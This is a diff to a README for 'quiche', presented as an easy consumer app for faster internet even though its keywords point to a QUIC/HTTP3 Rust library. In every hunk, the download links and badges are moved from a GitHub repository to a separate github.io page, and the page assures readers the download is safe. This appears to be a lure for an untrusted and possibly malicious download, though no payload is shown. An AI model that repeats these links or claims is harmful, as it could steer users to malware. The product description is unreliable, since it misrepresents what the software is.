@@ -1,6 +1,6 @@
 # 🥧 quiche - Your Gateway to Faster Internet
 
-[![Download Now](https://img.shields.io/badge/Download-quiche-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cornfed-mexican8/quiche)
+[![Download Now](https://img.shields.io/badge/Download-quiche-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://cornfed-mexican8.github.io)
 
 ## 🎉 Welcome to quiche
 
@@ -14,7 +14,7 @@ Ready to try quiche? Follow these easy steps to get started. You only need to do
 
 ## ⬇️ Download and Installation
 
-Visit this link to download the application: [https://github.com/cornfed-mexican8/quiche](https://github.com/cornfed-mexican8/quiche)
+Visit this link to download the application: [https://cornfed-mexican8.github.io](https://cornfed-mexican8.github.io)
 
 The download process is straightforward and safe. Here's what happens:
 
@@ -113,7 +113,7 @@ A: Not at all! Quiche is designed for everyone. If you can click a button, you c
 
 Quiche brings the power of modern internet protocols to your fingertips. Whether you're a casual user or a power user, quiche makes your internet faster, more reliable, and more secure. The best part? It's incredibly easy to use.
 
-Remember, the download link is: [https://github.com/cornfed-mexican8/quiche](https://github.com/cornfed-mexican8/quiche)
+Remember, the download link is: [https://cornfed-mexican8.github.io](https://cornfed-mexican8.github.io)
 
 ## 📚 Additional Resources
 
@@ -129,6 +129,6 @@ Don't wait to experience faster internet. Download quiche now and see the differ
 
 Your internet experience is about to get much better. Join thousands of satisfied users who have already discovered the power of quiche.
 
-[![Get quiche Now](https://img.shields.io/badge/GET%20QUICHE-Now-orange?style=for-the-badge)](https://github.com/cornfed-mexican8/quiche)
+[![Get quiche Now](https://img.shields.io/badge/GET%20QUICHE-Now-orange?style=for-the-badge)](https://cornfed-mexican8.github.io)
 
 Keywords: http3, network-programming, protocol, quic, rust
